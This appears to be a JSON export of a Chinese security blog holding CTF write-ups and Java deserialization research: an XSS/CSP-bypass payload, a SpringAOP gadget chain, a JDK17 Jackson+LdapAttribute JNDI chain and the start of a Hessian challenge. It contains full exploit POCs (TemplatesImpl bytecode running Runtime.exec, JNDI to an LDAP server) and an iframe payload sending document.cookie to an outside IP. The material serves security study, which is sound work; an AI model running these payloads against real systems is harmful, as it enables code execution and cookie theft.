sanitizeContent(atob(decodeURI(queryText))); console.log(sanitizedText) if (sanitizedText.length \u0026gt; 0) { textInput.innerHTML = sanitizedText; // 写入预览区 contentDisplay.innerHTML = textInput.innerText; // 写入效果显示区 insertButton.disabled = false; } else { textInput.innerText = \u0026#34;Only allow h1, h2 tags and plain text\u0026#34;; } 这里contentDisplay的值是textInput的innerText啊(就是textInput在浏览器上展示的字符)\n那就可以很简单的利用html实体编码来绕过\n可以看到很成功的插入我们的标签，但是这里并没有被DOM所渲染，这里就用到hint了\n我们使用iframe框架来插入script\n\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39;/a/;fetch(%60http://111.229.198.6:5000/%60+document.cookie);//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe 可以看到成功执行了，也成功被csp拦了(\n接下来的绕csp就其实很简单了，在前段时间的sekaiCTF做过相同的题\nhttps://www.justus.pw/writeups/sekai-ctf/tagless.html\n就是利用了404的页面来写入我们的js代码，再用src进行引入就行了\n这里不讲太多，直接贴payload\n\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39;/a/;fetch(%60http://ip:5000/%60+document.cookie);//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ","date":"2025-02-11T23:00:00+08:00","permalink":"http://localhost:1313/post/2025n1junior-wp/","section":"post","tags":null,"title":"[2025]N1junior-WP"},{"categories":["Java安全"],"contents":"前言 在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下\n正文 依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类\n流程 调用链如下\nJdkDynamicAopProxy.invoke()-\u0026gt;\rReflectiveMethodInvocation.proceed()-\u0026gt;\rAspectJAroundAdvice-\u0026gt;invoke-\u0026gt;\rorg.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-\u0026gt;\rmethod.invoke() 执行类是org.springframework.aop.aspectj.AbstractAspectJAdvice的invokeAdviceMethodWithGivenArgs方法\nprotected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {\rObject[] actualArgs = args;\rif (this.aspectJAdviceMethod.getParameterCount() == 0) {\ractualArgs = null;\r}\rtry {\rReflectionUtils.makeAccessible(this.aspectJAdviceMethod);\rreturn this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);\r} catch (IllegalArgumentException ex) {\rthrow new AopInvocationException(\u0026#34;Mismatch on arguments to advice method [\u0026#34; + this.aspectJAdviceMethod + \u0026#34;]; pointcut expression [\u0026#34; + this.pointcut.getPointcutExpression() + \u0026#34;]\u0026#34;, ex);\r} catch (InvocationTargetException ex) {\rthrow ex.getTargetException();\r}\r} 直接在AOP依赖下的一个sink点，有着反射执行任意方法的能力，操作空间很大\n在他的实现子类，在他的子类基本上invoke(before)方法的都调用了他的invokeAdviceMethod方法的，所以我们只需要找到一个方法能够调用invoke(before)即可\n然后下一步找到了ReflectiveMethodInvocation类,他的proceed就能够满足我们上面的要求\n接下来在JdkDynamicAopProxy的invoke方法将会调用proceed方法\n这里有一点很有趣，就是ReflectiveMethodInvocation类是没有实现serializable接口的，所以我们不能将这个类放进我们的writeObject里面，但是在JdkDynamicAopProxy直接帮我们new了一个新的出来,也是很巧了\n然后流程大致就是这样，接下来我们说一下payload执行中的一些知识点\n构建payload中所需注意的 触发JdkDynamicAopProxy的invoke方法有很多种操作方式了，从invoke的触发流程来看，下面这俩method是肯定触发不了这条链子的，会提前return导致我们想要执行的代码没执行到\nhashcode()\requals() 所以我们这里使用了平常非常常见的toString入口类\n上面流程的图片也看到了，如果要走到proceed方法那里，那首先还得过一下chain.isEmpty()这个判断\nchain由以下代码产生\nList\u0026lt;Object\u0026gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); public List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) {\rMethodCacheKey cacheKey = new MethodCacheKey(method);\rList\u0026lt;Object\u0026gt; cached = (List)this.methodCache.get(cacheKey);\rif (cached == null) {\rcached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);\rthis.methodCache.put(cacheKey, cached);\r}\rreturn cached;\r} 因为methodCache由transient修饰，不能在反序列化中被恢复，所以这里的methodCache一开始一定为空，那我们就要看到getInterceptorsAndDynamicInterceptionAdvice方法了\nadvisorChainFactory对应的接口实现类只有DefaultAdvisorChainFactory，这里只能看看它的\npublic List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) {\rAdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance();\rAdvisor[] advisors = config.getAdvisors();\rList\u0026lt;Object\u0026gt; interceptorList = new ArrayList(advisors.length);\rClass\u0026lt;?\u0026gt; actualClass = targetClass != null ? targetClass : method.getDeclaringClass();\rBoolean hasIntroductions = null;\rfor(Advisor advisor : advisors) {\rif (advisor instanceof PointcutAdvisor) {\rPointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor;\rif (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) {\rMethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher();\rboolean match;\rif (mm instanceof IntroductionAwareMethodMatcher) {\rif (hasIntroductions == null) {\rhasIntroductions = hasMatchingIntroductions(advisors, actualClass);\r}\rmatch = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions);\r} else {\rmatch = mm.matches(method, actualClass);\r}\rif (match) {\rMethodInterceptor[] interceptors = registry.getInterceptors(advisor);\rif (mm.isRuntime()) {\rfor(MethodInterceptor interceptor : interceptors) {\rinterceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm));\r}\r} else {\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r}\r}\r} else if (advisor instanceof IntroductionAdvisor) {\rIntroductionAdvisor ia = (IntroductionAdvisor)advisor;\rif (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) {\rInterceptor[] interceptors = registry.getInterceptors(advisor);\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r} else {\rInterceptor[] interceptors = registry.getInterceptors(advisor);\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r}\rreturn interceptorList;\r} 我们可以发现，不管是那种方式添加进入interceptorList的，其所对应的成员往往是从registry.getInterceptors(advisor);来的\n那这里我们顺藤摸瓜,registry所对应的类是DefaultAdvisorAdapterRegistry\n对应的getInterceptors代码如下\n那这里我们只有从第一个判断口进入才能够添加interceptors，不过要求是我们的advisor必须实现了MethodInterceotor接口,简单看了一下继承关系，和文章师傅里得出的结论一样：没有同时实现了该接口的advisor类\n面对此种情况，我们使用了动态代理去将MethodInterceotor给advisor类代理上，使其实现双接口\n这里又用到了一次JdkDynamicAopProxy,不过和前面的作用完全不同\n然后这里就能够顺利return回我们想要的interceptors,chain也能执行到我们的proceed方法了\n最后就是在我们的org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs中\nthis.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs); 这里还要从aspectInstanceFactory中获取到一个方法类的实例,文章中是使用了SingletonAspectInstanceFactory这个类\n和CC里的ConstantTransformer很相似\nPOC import Utils.Util;\rimport com.fasterxml.jackson.databind.node.POJONode;\rimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\rimport javassist.ClassPool;\rimport javassist.CtClass;\rimport javassist.CtConstructor;\rimport org.aopalliance.aop.Advice;\rimport org.aopalliance.intercept.MethodInterceptor;\rimport org.springframework.aop.aspectj.AbstractAspectJAdvice;\rimport org.springframework.aop.aspectj.AspectJAroundAdvice;\rimport org.springframework.aop.aspectj.AspectJExpressionPointcut;\rimport org.springframework.aop.aspectj.SingletonAspectInstanceFactory;\rimport org.springframework.aop.framework.AdvisedSupport;\rimport org.springframework.aop.support.DefaultIntroductionAdvisor;\rimport org.springframework.core.Ordered;\rimport java.lang.reflect.*;\rimport java.util.PriorityQueue;\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport javax.management.BadAttributeValueExpException;\rimport javax.xml.transform.Templates;\rpublic class main {\rpublic static void main(String[] args) throws Exception {\rClassPool pool = ClassPool.getDefault();\rCtClass clazz = pool.makeClass(\u0026#34;a\u0026#34;);\rCtClass superClass = pool.get(AbstractTranslet.class.getName());\rclazz.setSuperclass(superClass);\rCtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);\rconstructor.setBody(\u0026#34;Runtime.getRuntime().exec(\\\u0026#34;open -na Calculator\\\u0026#34;);\u0026#34;);\rclazz.addConstructor(constructor);\rbyte[][] bytes = new byte[][]{clazz.toBytecode()};\rTemplatesImpl templates = TemplatesImpl.class.newInstance();\rUtil.setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, bytes);\rUtil.setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;GSBP\u0026#34;);\rUtil.setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, null);\rMethod method=templates.getClass().getMethod(\u0026#34;newTransformer\u0026#34;);//获取newTransformer方法\rSingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);\rAspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);\rProxy proxy1 = (Proxy) getAProxy(advice,Advice.class);\rBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);\rUtil.setFieldValue(badAttributeValueExpException, \u0026#34;val\u0026#34;, proxy1);\rUtil.deserialize(Util.serialize(badAttributeValueExpException));\r}\rpublic static Object getBProxy(Object obj,Class[] clazzs) throws Exception\r{\rAdvisedSupport advisedSupport = new AdvisedSupport();\radvisedSupport.setTarget(obj);\rConstructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class);\rconstructor.setAccessible(true);\rInvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\rObject proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);\rreturn proxy;\r}\rpublic static Object getAProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception\r{\rAdvisedSupport advisedSupport = new AdvisedSupport();\radvisedSupport.setTarget(obj);\rAbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;\rDefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));\radvisedSupport.addAdvisor(advisor);\rConstructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class);\rconstructor.setAccessible(true);\rInvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\rObject proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);\rreturn proxy;\r}\r} 参考文章 https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ\n","date":"2025-01-23T23:33:31+08:00","permalink":"http://localhost:1313/post/springaop/","section":"post","tags":null,"title":"SpringAOP链学习"},{"categories":["Java安全","WP"],"contents":"起因 本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute+Jackson死活没通，后面自己调试了一下，这里做个记录\n题目分析 题目名叫JDBCParty,jdk版本是17，里面给了个接口源码如下\n@PostMapping({\u0026#34;/dbtest\u0026#34;}) public ResponseEntity\u0026lt;String\u0026gt; dbtest(String data) { try { User credentials = (User)Utils.deserialize(data); Class.forName(this.driverClassName); try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) { if (connection.isValid(5)) { return ResponseEntity.ok(\u0026#34;connect success\u0026#34;); } else { return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\u0026#34;connect failed\u0026#34;); } } } catch (Exception e) { e.printStackTrace(); return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\u0026#34;connect failed \u0026#34; + e.getMessage()); } } } 表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。\n实际入口是那个反序列化，从这个反序列化里面做文章\n然后看看题目给的依赖\n- \u0026#34;BOOT-INF/lib/spring-boot-3.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.5.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.5.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.23.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-2.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-2.0.16.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-swing-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-anim-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-parser-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-svg-dom-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-awt-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/commons-io-1.3.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/commons-logging-1.0.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-bridge-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-xml-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-css-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-dom-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xalan-2.7.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/serializer-2.7.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xml-apis-1.4.01.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-ext-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-gui-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-gvt-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-script-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-shared-resources-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-constants-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-i18n-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar\u0026#34; - \u0026#34;BOOT-INF/lib/fastjson2-2.0.37.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar\u0026#34; 有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作\n解 所以这里需要我们通过反序列化创造一个jndi注入\n这里就想到了24年的N1junior里的Derby Plus，里面是通过CB+LdapAttribute来实现了一个JNDI注入\n这里我们没有CB，但是有Fastjson2和jackson可以触发getter，在比赛的时候我写的poc如下\npackage org.example; import cn.hutool.db.ds.DataSourceWrapper; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.commons.jexl3.JexlBuilder; import org.apache.commons.jexl3.MapContext; import org.h2.jdbcx.JdbcDataSource; import org.h2.message.Trace; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.naming.CompositeName; import javax.naming.directory.Attribute; import javax.sql.DataSource; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.URL; import java.util.Base64; import java.util.Vector; import Utils.Util; //import static org.example.Main.deserial; //import static org.example.Main.serial; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; unSafe=Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unSafeField=unSafe.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); //获取基类模块 Module baseModule=Object.class.getModule(); Class\u0026lt;?\u0026gt; currentClass=test.class; //获取caller类的module field的地址 long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); //直接将基类module的值覆盖在我们的地址上 unSafeClass.getAndSetObject(currentClass,addr,baseModule); String ldapCtxUrl = \u0026#34;ldap://127.0.0.1:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor( new Class[] {String.class}); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance( new Object[] {\u0026#34;name\u0026#34;}); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); POJONode jsonNodes=new POJONode(ldapAttribute); EventListenerList list = new EventListenerList(); UndoManager manager = new UndoManager(); Vector vector = (Vector) getFieldValue(manager, \u0026#34;edits\u0026#34;); vector.add(jsonNodes); setFieldValue(list, \u0026#34;listenerList\u0026#34;, new Object[]{InternalError.class, manager}); System.out.println(Util.serialize(list)); deserialize(serialize(list)); } public static String serialize(Object object) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(object); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static void deserialize(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj, String field, Object arg) throws Exception { Field f = null; Class\u0026lt;?\u0026gt; c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { f = c.getDeclaredField(field); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } f.setAccessible(true); f.set(obj, arg); } public static Object getFieldValue(Object obj, String fieldName) throws Exception{ Field field = null; Class c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } field.setAccessible(true); return field.get(obj); } } 在反序列化的时候会触发以下报错\nException in thread \u0026#34;main\u0026#34; java.lang.RuntimeException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.jndi.ldap.LdapAttribute`: Failed to construct BeanSerializer for [simple type, class com.sun.jndi.ldap.LdapAttribute]: (java.lang.IllegalArgumentException) Failed to call `setAccess()` on Method \u0026#39;getAttributeSyntaxDefinition\u0026#39; (of class `com.sun.jndi.ldap.LdapAttribute`) due to `java.lang.reflect.InaccessibleObjectException`, problem: Unable to make public javax.naming.directory.DirContext com.sun.jndi.ldap.LdapAttribute.getAttributeSyntaxDefinition() throws javax.naming.NamingException accessible: module java.naming does not \u0026#34;opens com.sun.jndi.ldap\u0026#34; to unnamed module @19dc67c2 原因是在jackson反序列化的时候触发了一个模块化的机制，jdk17中的jackson在触发getter的时候，都会进行一次build\n在build时会对property(调用的目的类和目的方法)是否public进行一次判断，如果非public则会调用setAccessible来进行一次反射调用\nLdapAttribute类为private类\n然后便触发了模块化机制，导致了报错的产生\n比赛的时候脑子宕机了，后面自己思考的时候突然就想到了一个机制：动态代理\n在平常的时候，面对jackson反序列化时大家都会在外面套一层JdkDynamicAopProxy的代理，目的是为了保证反序列化时触发getter的稳定性\n在这里，我们的目的不是稳定性，而是通过invoke来绕过jackson反序列化DirContext类时的报错，原理如下\n由于在外面套了一层proxy，那么jackson就只会从动态代理类触发getter 然后又由JdkDynamicAopProxy动态代理类去触发LdapAttribute的getter,因为proxy类module位于java.base，所以能够访问任意包下的类而不会触发模块化，然后成功触发JNDI注入 没套proxy时\n套了之后\n然后后面就是常规套路打EL或者是SnakeYaml了，这里不做太多赘述\nPOC\npackage org.example; import cn.hutool.db.ds.DataSourceWrapper; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.commons.jexl3.JexlBuilder; import org.apache.commons.jexl3.MapContext; import org.h2.jdbcx.JdbcDataSource; import org.h2.message.Trace; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.naming.CompositeName; import javax.naming.directory.Attribute; import javax.sql.DataSource; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.URL; import java.util.Base64; import java.util.Vector; import Utils.Util; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; unSafe=Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unSafeField=unSafe.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); //获取基类模块 Module baseModule=Object.class.getModule(); Class\u0026lt;?\u0026gt; currentClass=test.class; //获取caller类的module field的地址 long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); //直接将基类module的值覆盖在我们的地址上 unSafeClass.getAndSetObject(currentClass,addr,baseModule); String ldapCtxUrl = \u0026#34;ldap://127.0.0.1:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor( new Class[] {String.class}); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance( new Object[] {\u0026#34;name\u0026#34;}); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); Proxy proxy= (Proxy) getProxy(ldapAttribute, Attribute.class); System.out.println(Proxy.class.getModule()); POJONode jsonNodes=new POJONode(ldapAttribute); EventListenerList list = new EventListenerList(); UndoManager manager = new UndoManager(); Vector vector = (Vector) getFieldValue(manager, \u0026#34;edits\u0026#34;); vector.add(jsonNodes); setFieldValue(list, \u0026#34;listenerList\u0026#34;, new Object[]{InternalError.class, manager}); System.out.println(Util.serialize(list)); deserialize(serialize(list)); } public static Object getProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler); return proxy; } public static String serialize(Object object) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(object); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static void deserialize(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj, String field, Object arg) throws Exception { Field f = null; Class\u0026lt;?\u0026gt; c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { f = c.getDeclaredField(field); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } f.setAccessible(true); f.set(obj, arg); } public static Object getFieldValue(Object obj, String fieldName) throws Exception{ Field field = null; Class c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } field.setAccessible(true); return field.get(obj); } } 最后 这题除了上述方法还有很多方法，比如fastjson触发Ldap的getter，然后fastjson和jackson这俩东西也可以触发依赖里的OracleCachedRowSet的getConnection()打jndi，这里放下篇文章里说吧\n","date":"2025-01-20T03:02:14+08:00","permalink":"http://localhost:1313/post/jdk17%E6%89%93jackson+ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","section":"post","tags":null,"title":"JDK17打Jackson+LdapAttruibute反序列化"},{"categories":["WP"],"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 